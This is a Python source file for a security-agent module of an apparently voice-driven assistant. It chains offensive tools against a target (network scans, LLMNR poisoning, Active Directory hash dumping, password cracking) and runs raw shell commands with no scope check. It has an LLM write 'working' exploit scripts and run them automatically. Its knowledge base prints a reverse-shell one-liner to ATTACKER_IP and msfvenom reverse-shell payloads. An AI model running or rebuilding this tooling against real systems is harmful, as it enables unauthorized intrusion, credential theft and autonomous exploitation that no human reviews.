        {"step": 2, "tool": "enum4linux",       "desc": "SMB/AD enumeration"},
        {"step": 3, "tool": "ldapsearch",       "desc": "LDAP enumeration"},
        {"step": 4, "tool": "rpcclient",        "desc": "RPC user enum"},
        {"step": 5, "tool": "responder",        "desc": "Poison LLMNR/NBT-NS"},
        {"step": 6, "tool": "impacket_secretsdump", "desc": "Dump hashes"},
    ],
}


# ─────────────────────────────────────────────────────────────────────────────
# SCOPE DETECTION — auto-detect target type
# ─────────────────────────────────────────────────────────────────────────────

def _detect_scope(target: str) -> str:
    """Detect target type for smart tool selection."""
    if not target:
        return "local"
    if "/" in target:
        return "subnet"
    if target.replace(".", "").isdigit():
        return "single_ip"
    if target.startswith("http"):
        return "web"
    if "." in target and not target[0].isdigit():
        return "domain"
    return "unknown"


def _smart_timeout_for_scope(target: str, base: int = 120) -> int:
    """Auto-scale timeout based on scope."""
    scope = _detect_scope(target)
    if scope == "subnet":
        try:
            prefix = int(target.split("/")[1])
            if prefix <= 16:
                return max(base, 600)
            elif prefix <= 24:
                return max(base, 300)
        except Exception:
            pass
        return max(base, 300)
    return base


# ─────────────────────────────────────────────────────────────────────────────
# AI EXPLOIT GENERATOR
# ─────────────────────────────────────────────────────────────────────────────

def _generate_exploit_with_ai(
    target_info: str, vulnerability: str, player=None, speak=None
) -> str:
    if not AI_AVAILABLE:
        return "AI not available for exploit generation."

    _log(player, f"[EVO] 🔥 Generating exploit for: {vulnerability}")
    if speak:
        speak("Generating custom exploit code, sir.")

    system = (
        "You are an elite exploit developer and security researcher. "
        "Write clean, functional Python security research code. "
        "The code must be self-contained, handle errors gracefully, "
        "and print results clearly. "
        "This is for authorized security testing on owned systems only."
    )

    prompt = (
        f"Write a complete, working Python script to test/exploit:\n"
        f"Vulnerability: {vulnerability}\n"
        f"Target info: {target_info}\n\n"
        f"Requirements:\n"
        f"1. Complete, runnable Python 3 script\n"
        f"2. Clear output showing what was found\n"
        f"3. Proper error handling\n"
        f"4. Use only standard library or requests/scapy/paramiko if needed\n"
        f"5. Include comments explaining each step\n\n"
        f"Return ONLY the Python code, no explanation."
    )

    result = ask_ai(
        prompt=prompt, system=system, preferred="gemini",
        temperature=0.2, max_tokens=8192, log=player,
    )

    if not result["success"]:
        return f"AI exploit generation failed: {result['error']}"

    code = result["text"]
    code = re.sub(r"```(?:python)?", "", code).strip().strip("`")

    tmp = Path("/tmp") if OS != "Windows" else Path(
        os.environ.get("TEMP", "C:\\Temp")
    )
    tmp.mkdir(parents=True, exist_ok=True)
    safe_name = re.sub(r"[^a-z0-9_]", "_", vulnerability.lower())[:30]
    script_path = tmp / f"exploit_{safe_name}.py"
    script_path.write_text(code, encoding="utf-8")

    _log(player, f"[EVO] ✅ Exploit saved: {script_path}")
    return str(script_path)


# ─────────────────────────────────────────────────────────────────────────────
# KILL CHAIN EXECUTOR
# ─────────────────────────────────────────────────────────────────────────────

def _run_kill_chain(
    chain_name: str, target: str, extra_params: dict,
    timeout: int, player=None, speak=None
) -> str:
    chain = KILL_CHAIN_TEMPLATES.get(chain_name)
    if not chain:
        return (
            f"Unknown chain: {chain_name}. "
            f"Available: {', '.join(KILL_CHAIN_TEMPLATES.keys())}"
        )

    # Make a copy so adaptive additions don't persist
    chain = [dict(s) for s in chain]

    if speak:
        speak(
            f"Initiating {chain_name.replace('_', ' ')} kill chain "
            f"against {target}, sir."
        )

    results = []
    total = len(chain)

    for i, step in enumerate(chain):
        tool_name = step["tool"]
        desc = step["desc"]

        _log(player, f"[CHAIN {i+1}/{total}] {desc} ({tool_name})")

        params = _build_params(target, extra_params)
        cmd = _build_command(tool_name, params)
        if not cmd:
            results.append(
                f"Step {i+1} ({tool_name}): Could not build command"
            )
            continue

        res = _run_command(cmd, timeout=timeout)
        output = res.get("output", "")[:500]
        results.append(
            f"\n{'='*50}\n"
            f"[Step {i+1}/{len(chain)}] {desc}\n"
            f"CMD: {cmd}\n"
            f"{'✅' if res['success'] else '❌'} {output}"
        )

        # ── Adaptive chain expansion ─────────────────────────────────────────
        if tool_name in ("nmap_full", "nmap_scan") and res["success"]:
            if "80/tcp" in output or "443/tcp" in output:
                _log(player, "[CHAIN] 🔍 Web detected — adding web recon")
                chain.append({"tool": "whatweb", "desc": "Auto: web fingerprint"})
                chain.append({"tool": "nikto_scan", "desc": "Auto: web vuln scan"})
            if "445/tcp" in output or "139/tcp" in output:
                _log(player, "[CHAIN] 🔍 SMB detected — adding SMB enum")
                chain.append({"tool": "enum4linux", "desc": "Auto: SMB enumeration"})
                chain.append({"tool": "smbclient", "desc": "Auto: list shares"})
            if "22/tcp" in output:
                _log(player, "[CHAIN] 🔍 SSH detected")
            if "3306/tcp" in output:
                _log(player, "[CHAIN] 🔍 MySQL detected")

    summary = "\n".join(results)
    _log(player, f"[CHAIN] ✅ Kill chain complete: {chain_name}")
    return f"[KILL CHAIN: {chain_name.upper()}]\nTarget: {target}\n{summary}"


# ─────────────────────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────────────────────

def _get_os_key() -> str:
    return {"Linux": "linux", "Darwin": "darwin", "Windows": "windows"}.get(
        OS, "linux"
    )


def _tool_available(tool_name: str) -> bool:
    return shutil.which(tool_name) is not None


def _build_params(target: str, extra: dict) -> dict:
    """Build a complete params dict with defaults."""
    return {
        "target":      target,
        "options":     extra.get("options", ""),
        "command":     extra.get("command", ""),
        "count":       extra.get("count", 4),
        "interface":   extra.get("interface", "eth0"),
        "filter":      extra.get("filter", ""),
        "record_type": extra.get("record_type", "A"),
        "hash":        extra.get("hash", ""),
        "text":        extra.get("text", ""),
        "algorithm":   extra.get("algorithm", "md5"),
        "password":    extra.get("password", ""),
        "wordlist":    extra.get(
            "wordlist", "/usr/share/wordlists/rockyou.txt"
        ),
        "hash_file":   extra.get("hash_file", ""),
        "mode":        extra.get("mode", "0"),
        "username":    extra.get("username", "admin"),
        "service":     extra.get("service", "ssh"),
        "method":      extra.get("method", "GET"),
        "headers":     extra.get("headers", ""),
        "data":        extra.get("data", ""),
        "file":        extra.get("file", ""),
        "secret":      extra.get("secret", ""),
    }


def _ask_security_ai(question: str, player=None, preferred: str = "gemini") -> str:
    if not AI_AVAILABLE:
        return "AI router not available."
    system = (
        "You are an elite cybersecurity expert and ethical hacker. "
        "Provide detailed, technical, accurate answers for authorized testing. "
        "Include specific commands, tools, and techniques."
    )
    result = ask_ai(
        prompt=question, system=system, preferred=preferred,
        temperature=0.3, max_tokens=8192, log=player,
    )
    if result["success"]:
        _log(player, f"[SEC AI] ✅ {result['provider']} ({result['model']})")
        return result["text"]
    return f"All AI providers failed: {result['error']}"


def _build_command(tool: str, params: dict) -> str | None:
    if tool not in TOOL_REGISTRY:
        return None
    os_key = _get_os_key()
    template = TOOL_REGISTRY[tool].get(os_key, "")
    try:
        return template.format(**{k: v or "" for k, v in params.items()})
    except KeyError:
        return template


def _run_command(command: str, timeout: int = 120) -> dict:
    try:
        result = subprocess.run(
            command, shell=True, capture_output=True,
            text=True, timeout=timeout
        )
        stdout = result.stdout.strip()
        stderr = result.stderr.strip()
        return {
            "success":    result.returncode == 0,
            "returncode": result.returncode,
            "stdout":     stdout,
            "stderr":     stderr,
            "output":     stdout or stderr,
        }
    except subprocess.TimeoutExpired:
        return {"success": False, "output": f"Command timed out after {timeout}s"}
    except Exception as e:
        return {"success": False, "output": str(e)}


def _run_command_streaming(command: str, timeout: int = 120, player=None) -> dict:
    """Run command with live output streaming to UI."""
    try:
        proc = subprocess.Popen(
            command, shell=True,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1
        )
        output_lines = []
        start = time.time()

        for line in iter(proc.stdout.readline, ""):
            if time.time() - start > timeout:
                proc.kill()
                output_lines.append(f"[TIMEOUT after {timeout}s]")
                break
            line = line.rstrip()
            if line:
                output_lines.append(line)
                _log(player, line[:200])

        proc.wait(timeout=5)
        output = "\n".join(output_lines)
        return {
            "success":    proc.returncode == 0,
            "returncode": proc.returncode,
            "output":     output,
        }
    except Exception as e:
        return {"success": False, "output": str(e)}


def _run_python_script(code: str, timeout: int = 60) -> dict:
    tmp = Path("/tmp") if OS != "Windows" else Path(
        os.environ.get("TEMP", "C:\\Temp")
    )
    tmp.mkdir(parents=True, exist_ok=True)
    script_path = tmp / "jarvis_sec_script.py"
    script_path.write_text(code, encoding="utf-8")
    return _run_command(f"python3 {script_path}", timeout=timeout)


def _run_generated_exploit(script_path: str, timeout: int = 60) -> str:
    result = _run_command(f"python3 {script_path}", timeout=timeout)
    return result.get("output", "No output")[:2000]


def _format_result(cmd: str, result: dict) -> str:
    status = "✅ Success" if result["success"] else "❌ Failed"
    output = result.get("output", "No output.")
    return f"{status}\nCMD: {cmd}\n{'─'*50}\n{output[:3000]}"


def _log(player, message: str):
    if player:
        try:
            player.write_log(f"[SEC] {message[:300]}")
        except Exception:
            pass


# ─────────────────────────────────────────────────────────────────────────────
# GHOST MODE INTEGRATION — access daemon's ghost features
# ─────────────────────────────────────────────────────────────────────────────

def _get_daemon():
    """Try to get the daemon instance."""
    try:
        from core.daemon import get_daemon
        return get_daemon()
    except Exception:
        return None


# ─────────────────────────────────────────────────────────────────────────────
# MAIN AGENT FUNCTION
# ─────────────────────────────────────────────────────────────────────────────

def security_agent(parameters: dict, player=None, speak=None) -> str:
    action  = parameters.get("action", "custom")
    target  = parameters.get("target", "")
    tool    = parameters.get("tool", action)
    command = parameters.get("command", "")
    code    = parameters.get("code", "")
    timeout = int(parameters.get("timeout",
                                 _smart_timeout_for_scope(target)))
    options = parameters.get("options", "")

    # ── AUTHORIZED ASSESSMENT MODE ────────────────────────────────────────
    if action == "authorized_assessment":
        module_name = parameters.get("module", "asset_discovery")
        approval = parameters.get("approval", "")
        scope = parameters.get("scope", target or "")
        project_id = parameters.get("project_id", "")
        approver = parameters.get("approver", "")
        authorization = AuthorizationContext(
            project_id=project_id or "default",
            authorized_scope=[scope] if scope else [],
            approver=approver or "",
            notes=parameters.get("notes", ""),
            active=bool(approval and approval.lower() == "approved"),
        )
        findings = _PLATFORM.run_module(module_name, authorization, parameters)
        if findings and findings[0].title == "Authorization required":
            return (
                "Authorization required: this platform only performs assessments for "
                "systems with explicit written permission. Provide approval='approved', "
                "project_id, approver, and an in-scope target before active assessment."
            )
        report_path = _PLATFORM.save_report(f"assessment_{module_name}", findings)
        return (
            f"Authorized assessment workflow started for module '{module_name}'. "
            f"Findings: {len(findings)}. Report saved to {report_path}."
        )

    # ── AI Q&A MODE ───────────────────────────────────────────────────────────
    if action in ("explain", "info", "help", "ask", "analyze", "advice"):
        topic = (
            parameters.get("topic", target)
            or parameters.get("query", "")
        )
        question = parameters.get("question", topic)
        preferred = parameters.get("preferred_ai", "gemini")
        if not question:
            return "Please provide a topic or question."
        if speak:
            speak("Consulting knowledge base, sir.")
        local = _explain(question)
        if "No specific entry" not in local:
            return local
        _log(player, f"[SEC] 🤖 Asking AI: {question[:80]}")
        return _ask_security_ai(
            question, player=player, preferred=preferred
        )

    # ── PYTHON SCRIPT MODE ────────────────────────────────────────────────────
    if action == "run_script" and code:
        if speak:
            speak("Running security script, sir.")
        result = _run_python_script(code, timeout=timeout)
        _log(player, f"Script output:\n{result['output'][:500]}")
        return result["output"][:3000]

    # ── CUSTOM RAW COMMAND ────────────────────────────────────────────────────
    if action in ("custom", "run") and (command or parameters.get("command")):
        cmd = command or parameters.get("command", "")
        if not cmd:
            return "No command provided."
        if speak:
            speak("Running command, sir.")
        result = _run_command(cmd, timeout=timeout)
        _log(player, f"CMD: {cmd[:100]}\n{result['output'][:400]}")
        return _format_result(cmd, result)

    # ── KILL CHAIN MODE ───────────────────────────────────────────────────────
    if action == "kill_chain":
        chain_name = parameters.get("chain", "full_recon")
        if not target:
            return "Target required for kill chain."
        return _run_kill_chain(
            chain_name, target, parameters, timeout, player, speak
        )

    # ── LIST KILL CHAINS ──────────────────────────────────────────────────────
    if action == "list_chains":
        lines = ["[AVAILABLE KILL CHAINS]"]
        for name, steps in KILL_CHAIN_TEMPLATES.items():
            lines.append(
                f"  • {name} — {len(steps)} steps: "
                f"{', '.join(s['desc'] for s in steps[:3])}..."
            )
        return "\n".join(lines)

    # ── AUTO EXPLOIT GENERATION ───────────────────────────────────────────────
    if action == "generate_exploit":
        vuln = parameters.get(
            "vulnerability", parameters.get("query", "")
        )
        if not vuln:
            return "Please specify a vulnerability to exploit."
        script_path = _generate_exploit_with_ai(
            target_info=target or "unknown",
            vulnerability=vuln, player=player, speak=speak,
        )
        if parameters.get("run", False):
            _log(player, f"[SEC] Running exploit: {script_path}")
            return _run_generated_exploit(script_path, timeout=timeout)
        return f"Exploit generated at: {script_path}"

    # ── AUTONOMOUS FULL PENTEST ───────────────────────────────────────────────
    if action == "auto_pentest":
        if not target:
            return "Target IP or range required."
        if speak:
            speak(
                f"Starting autonomous penetration test against "
                f"{target}, sir. This will take several minutes."
            )
        _log(player, f"[SEC] 🎯 Auto-pentest: {target}")

        results = []
        params = _build_params(target, parameters)

        # Phase 1: Recon
        _log(player, "[PENTEST] Phase 1: Reconnaissance")
        scope = _detect_scope(target)
        if scope == "subnet":
            recon_tool = "nmap_scan"
            params["options"] = "-sV --open -T4"
        else:
            recon_tool = "nmap_full"
        recon_cmd = _build_command(recon_tool, params)
        recon = _run_command_streaming(recon_cmd, timeout=240, player=player)
        results.append(f"[RECON]\n{recon['output'][:1500]}")

        # Phase 2: Vuln scan
        _log(player, "[PENTEST] Phase 2: Vulnerability scanning")
        vuln_cmd = _build_command("nmap_vuln", params)
        vuln = _run_command(vuln_cmd, timeout=180)
        results.append(f"[VULN SCAN]\n{vuln['output'][:1500]}")

        # Phase 3: Web if port 80/443 found
        recon_output = recon.get("output", "")
        if any(p in recon_output for p in [
            "80/tcp", "443/tcp", "8080/tcp", "8443/tcp"
        ]):
            _log(player, "[PENTEST] Phase 3: Web testing")
            web_params = dict(params)
            web_params["target"] = f"http://{target}"
            for web_tool in ["whatweb", "nikto_scan", "gobuster"]:
                cmd = _build_command(web_tool, web_params)
                if cmd:
                    r = _run_command(cmd, timeout=120)
                    results.append(
                        f"[{web_tool.upper()}]\n{r['output'][:800]}"
                    )

        # Phase 4: SMB if port 445 found
        if "445/tcp" in recon_output or "139/tcp" in recon_output:
            _log(player, "[PENTEST] Phase 4: SMB enumeration")
            for smb_tool in ["enum4linux", "smbclient"]:
                cmd = _build_command(smb_tool, params)
                if cmd:
                    r = _run_command(cmd, timeout=60)
                    results.append(
                        f"[{smb_tool.upper()}]\n{r['output'][:800]}"
                    )

        # Phase 5: Exploit search
        _log(player, "[PENTEST] Phase 5: Exploit search")
        sploit_params = dict(params)
        sploit_params["options"] = "--json"
        sploit_cmd = _build_command("searchsploit", sploit_params)
        if sploit_cmd:
            sploit = _run_command(sploit_cmd, timeout=30)
            results.append(f"[EXPLOITS]\n{sploit['output'][:800]}")

        # Save report
        safe_target = re.sub(r"[^a-zA-Z0-9_.-]", "_", target)
        report_path = Path(f"/tmp/pentest_{safe_target}.txt")
        full_report = "\n\n".join(results)
        report_path.write_text(full_report, encoding="utf-8")

        _log(player, f"[PENTEST] ✅ Complete. Report: {report_path}")
        if speak:
            speak(
                f"Autonomous pentest complete, sir. "
                f"Report saved. "
                f"Phases completed: recon, vulnerability scan, "
                f"web testing, and exploit search."
            )
        return (
            f"[AUTO PENTEST COMPLETE]\n"
            f"Report: {report_path}\n\n{full_report[:3000]}"
        )

    # ── PRIVESC CHECK ─────────────────────────────────────────────────────────
    if action == "privesc_check":
        if speak:
            speak("Running privilege escalation check, sir.")
        return _run_kill_chain(
            "privesc_linux", target or "localhost",
            parameters, timeout, player, speak
        )

    # ── GHOST MODE — Background Listeners & Honeypots ─────────────────────────
    if action == "start_listener":
        port = int(parameters.get("port", 4444))
        daemon = _get_daemon()
        if daemon:
            if speak:
                speak(f"Starting ghost listener on port {port}, sir.")
            return daemon.start_ghost_listener(port)
        # Fallback without daemon
        if speak:
            speak(f"Starting background listener on port {port}, sir.")
        cmd = f"nohup nc -lvnp {port} > /tmp/listener_{port}.log 2>&1 &"
        _run_command(cmd)
        return f"Listener started on port {port}. Log: /tmp/listener_{port}.log"

    if action == "stop_listener":
        port = int(parameters.get("port", 4444))
        daemon = _get_daemon()
        if daemon:
            return daemon.stop_ghost_listener(port)
        _run_command(f"fuser -k {port}/tcp 2>/dev/null")
        return f"Listener on port {port} stopped."

    if action == "check_listener":
        port = int(parameters.get("port", 4444))
        daemon = _get_daemon()
        if daemon:
            return daemon.check_ghost_listener(port)
        log_path = Path(f"/tmp/listener_{port}.log")
        if log_path.exists():
            content = log_path.read_text(errors="ignore")
            if "connect" in content.lower():
                return f"🚨 CONNECTION on port {port}!\n{content[:1000]}"
            return f"No connections on port {port} yet."
        return "Listener log not found."

    if action == "list_listeners":
        daemon = _get_daemon()
        if daemon:
            return daemon.list_ghost_listeners()
        return "Daemon not running. Use start_listener first."

    if action == "start_honeypot":
        port = int(parameters.get("port", 8888))
        banner = parameters.get("options", "SSH-2.0-OpenSSH_8.9")
        daemon = _get_daemon()
        if daemon:
            if speak:
                speak(f"Deploying honeypot on port {port}, sir.")
            return daemon.start_honeypot(port, banner)
        return "Daemon not running. Cannot start honeypot."

    # ── DAEMON STATUS & ALERTS ────────────────────────────────────────────────
    if action == "daemon_status":
        daemon = _get_daemon()
        if daemon:
            return daemon.get_status()
        return "Daemon not running."

    if action == "daemon_alerts":
        daemon = _get_daemon()
        if daemon:
            count = int(parameters.get("count", 10))
            return daemon.get_alerts(count)
        return "Daemon not running."

    # ── TOOL MODE (all registered tools) ──────────────────────────────────────
    if tool in TOOL_REGISTRY or action in TOOL_REGISTRY:
        selected = tool if tool in TOOL_REGISTRY else action
        params = _build_params(target, parameters)

        cmd = _build_command(selected, params)
        if not cmd:
            return f"Could not build command for tool: {selected}"

        desc = TOOL_REGISTRY[selected]["description"]
        if speak:
            speak(f"Running {desc}, sir.")

        _log(player, f"SEC ▶ {cmd}")

        # Use streaming for long-running scans
        long_running = {
            "nmap_full", "nmap_vuln", "nmap_udp", "auto_recon",
            "nikto_scan", "gobuster", "sqlmap", "wpscan", "hydra",
            "hashcat", "john", "linpeas", "wifite", "ffuf",
            "dirb", "wfuzz", "amass", "subfinder",
        }
        if selected in long_running:
            result = _run_command_streaming(cmd, timeout=timeout, player=player)
        else:
            result = _run_command(cmd, timeout=timeout)

        _log(player, result["output"][:400])
        return _format_result(cmd, result)

    # ── FALLBACK → AI ─────────────────────────────────────────────────────────
    query = parameters.get("query", action)
    if query and query != "custom":
        _log(player, f"[SEC] Unknown '{action}' — routing to AI")
        return _ask_security_ai(
            f"Security task: {query}\nTarget: {target}",
            player=player,
            preferred=parameters.get("preferred_ai", "gemini")
        )

    return (
        f"Unknown action '{action}'. "
        f"Available: kill_chain, auto_pentest, privesc_check, "
        f"generate_exploit, start_listener, stop_listener, "
        f"check_listener, list_listeners, start_honeypot, "
        f"daemon_status, daemon_alerts, run_script, custom, explain, "
        f"and all TOOL_REGISTRY tools."
    )


# ─────────────────────────────────────────────────────────────────────────────
# KNOWLEDGE BASE
# ─────────────────────────────────────────────────────────────────────────────

KNOWLEDGE_BASE = {
    "sql_injection": (
        "SQL Injection exploits unsanitized user input in database queries. "
        "Tools: sqlmap. Prevention: parameterized queries, ORM, input validation."
    ),
    "xss": (
        "Cross-Site Scripting (XSS) injects malicious scripts into web pages. "
        "Types: stored, reflected, DOM-based. Prevention: CSP, output encoding."
    ),
    "buffer_overflow": (
        "Buffer overflow writes beyond allocated memory to hijack control flow. "
        "Tools: gdb, pwntools. Prevention: ASLR, stack canaries, safe functions."
    ),
    "phishing": (
        "Social engineering attack via fake emails/sites to steal credentials. "
        "Tools: GoPhish, SET. Prevention: MFA, security awareness, email filters."
    ),
    "mitm": (
        "Man-in-the-Middle intercepts communication between two parties. "
        "Tools: ettercap, bettercap, Wireshark. Prevention: HTTPS, certificate pinning."
    ),
    "ransomware": (
        "Malware that encrypts files and demands payment for decryption. "
        "Prevention: offline backups, patch management, endpoint protection."
    ),
    "privilege_escalation": (
        "Gaining higher permissions than intended. "
        "Linux: sudo misconfig, SUID, kernel exploits. Windows: token impersonation. "
        "Tools: linpeas, winpeas, GTFOBins."
    ),
    "reverse_shell": (
        "A shell where the victim connects back to the attacker. "
        "Payloads: bash, python, nc, msfvenom. "
        "Example: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
    ),
    "ctf": (
        "Capture The Flag competitions test cybersecurity skills. "
        "Categories: web, pwn, crypto, forensics, reversing, OSINT. "
        "Platforms: HackTheBox, TryHackMe, PicoCTF, CTFtime."
    ),
    "nmap": (
        "Network Mapper — the most powerful port/service scanner. "
        "Common flags: -sV (version), -sC (scripts), -O (OS), -A (all), "
        "-p- (all ports), --script vuln (vuln scan)."
    ),
    "metasploit": (
        "The most popular exploitation framework. "
        "Key commands: search, use, set RHOSTS, set PAYLOAD, run/exploit. "
        "Modules: auxiliary, exploit, payload, post."
    ),
    "wireshark": (
        "Packet analyzer for network traffic. "
        "Useful filters: http, dns, tcp.port==80, ip.addr==x.x.x.x. "
        "CLI version: tshark."
    ),
    "hydra": (
        "Fast network login cracker supporting many protocols. "
        "Protocols: ssh, ftp, http, smb, rdp, mysql. "
        "Usage: hydra -l user -P wordlist target service"
    ),
    "wifite": (
        "Automated wireless attack tool for Linux. "
        "Attacks WEP, WPA, WPA2, and WPS. "
        "Requires: aircrack-ng suite, monitor mode adapter."
    ),
    "aircrack_suite": (
        "airmon-ng (monitor mode), airodump-ng (capture), "
        "aireplay-ng (injection/deauth), aircrack-ng (crack). "
        "Workflow: airmon-ng start → airodump-ng → aireplay-ng → aircrack-ng"
    ),
    "bettercap": (
        "Powerful MITM framework. "
        "ARP spoofing, DNS spoofing, HTTP/HTTPS proxy, WiFi recon, BLE."
    ),
    "ctf_tools": (
        "CTF toolkit:\n"
        "Web: Burp Suite, ffuf, sqlmap, XSStrike\n"
        "Pwn: pwntools, gdb+peda, ghidra, radare2\n"
        "Crypto: CyberChef, hashcat, john\n"
        "Forensics: Autopsy, Volatility, binwalk, foremost, exiftool\n"
        "Stego: steghide, zsteg, stegsolve\n"
        "Reversing: Ghidra, IDA, radare2, strings, objdump"
    ),
    "osint": (
        "OSINT tools: theHarvester, Maltego, Shodan, Recon-ng, "
        "subfinder, amass, Google Dorks"
    ),
    "payload_generation": (
        "msfvenom examples:\n"
        "Windows: -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe\n"
        "Linux: -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf\n"
        "Python: -p cmd/unix/reverse_python LHOST=IP LPORT=4444\n"
        "PHP: -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw"
    ),
    "wordlists": (
        "Common: /usr/share/wordlists/rockyou.txt, "
        "/usr/share/wordlists/dirb/common.txt, /usr/share/seclists/. "
        "Generate: crunch, cewl, cupp"
    ),
    "privesc_linux": (
        "Linux PrivEsc: sudo -l, SUID (find / -perm -4000), "
        "crontab -l, GTFOBins, kernel exploits, writable /etc/passwd, linPEAS"
    ),
    "kill_chains": (
        "Available: full_recon, web_attack, network_attack, "
        "privesc_linux, wifi_attack, password_audit, ctf_web, "
        "smb_attack, ad_attack"
    ),
    "ghost_mode": (
        "Ghost Mode provides background listeners and honeypots:\n"
        "start_listener — netcat listener on any port\n"
        "check_listener — check for incoming connections\n"
        "start_honeypot — fake service that logs connection attempts\n"
        "daemon_status — check all background watchers\n"
        "daemon_alerts — view recent security alerts"
    ),
}


def _explain(topic: str) -> str:
    topic_clean = topic.lower().replace(" ", "_").replace("-", "_")
    for key, value in KNOWLEDGE_BASE.items():
        if key in topic_clean or topic_clean in key:
            return f"[SECURITY INTEL] {key.upper()}\n{value}"
    return (
        f"No specific entry for '{topic}' in the knowledge base. "
        f"Known topics: {', '.join(KNOWLEDGE_BASE.keys())}"
    )